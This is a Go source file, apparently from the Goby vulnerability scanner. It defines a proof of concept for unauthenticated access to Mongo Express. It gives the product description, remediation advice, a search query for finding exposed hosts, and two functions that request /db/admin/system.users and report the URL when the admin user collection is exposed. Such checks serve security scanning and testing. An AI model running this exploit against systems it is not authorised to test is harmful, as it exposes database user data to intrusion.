package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mongo Express Unauthorized Access",
    "Description": "<p>Mongo Express is an open source MongoDB web management interface based on Node.js and express.</p><p>Mongo Express has an unauthorized access vulnerability that could allow attackers to obtain user information or modify system data.</p>",
    "Impact": "Mongo Express Unauthorized Access",
    "Recommendation": "<p>Vendors have not released bug fixes, please pay attention to updates <a href=\"https://github.com/mongo-express/mongo-express\">https://github.com/mongo-express/mongo-express</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "Product": "Mongo Express",
    "VulType": [
        "Unauthorized Access"
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "Translation": {
        "CN": {
            "Name": "Mongo Express 未授权访问漏洞",
            "Description": "<p>Mongo Express 是一个基于 Node.js 和 express 的开源的 MongoDB Web管理界面。<br></p><p>Mongo Express<span style=\"color: var(--primaryFont-color);\">&nbsp;</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">&nbsp;存在未授权访问漏洞，攻击者可通过该漏洞获取用户信息或修改系统数据。</span><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">Mongo Express</span><span style=\"color: var(--primaryFont-color); font-size: 16px;\">&nbsp;</span><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">&nbsp;存在未授权访问漏洞，攻击者可通过该漏洞获取用户信息或修改系统数据。</span><br></p>",
            "Recommendation": "<p>厂商未发布了漏洞修复程序，请及时关注更新&nbsp;<a href=\"https://github.com/mongo-express/mongo-express\">https://github.com/mongo-express/mongo-express</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Mongo Express",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Mongo Express Unauthorized Access",
            "Description": "<p>Mongo Express is an open source MongoDB web management interface based on Node.js and express.</p><p>Mongo Express has an unauthorized access vulnerability that could allow attackers to obtain user information or modify system data.</p>",
            "Impact": "Mongo Express Unauthorized Access",
            "Recommendation": "<p>Vendors have not released bug fixes, please pay attention to updates&nbsp;<a href=\"https://github.com/mongo-express/mongo-express\">https://github.com/mongo-express/mongo-express</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Product": "Mongo Express",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "FofaQuery": "title=\"Home - Mongo Express\"",
    "GobyQuery": "title=\"Home - Mongo Express\"",
    "Author": "AnMing",
    "Homepage": "https://github.com/mongo-express/mongo-express",
    "DisclosureDate": "2021-05-24",
    "References": [
        "https://github.com/Micr067/nuclei-templates/blob/fce3987d9db2cb965e9eb8e93bc0931719af6349/misconfiguration/unauthenticated-mongo-express.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/db/admin/system.users"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "system.users") && strings.Contains(resp.Utf8Html, "Collection Stats") && resp.StatusCode == 200 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/db/admin/system.users"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "system.users") && strings.Contains(resp.Utf8Html, "Collection Stats") && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = "Success ! Plase visit the url to get this information :\n" + expResult.HostInfo.FixedHostInfo + url
				} else {
					expResult.Output = "Error! plase check your target!"
				}
			}
			return expResult
		},
	))
}
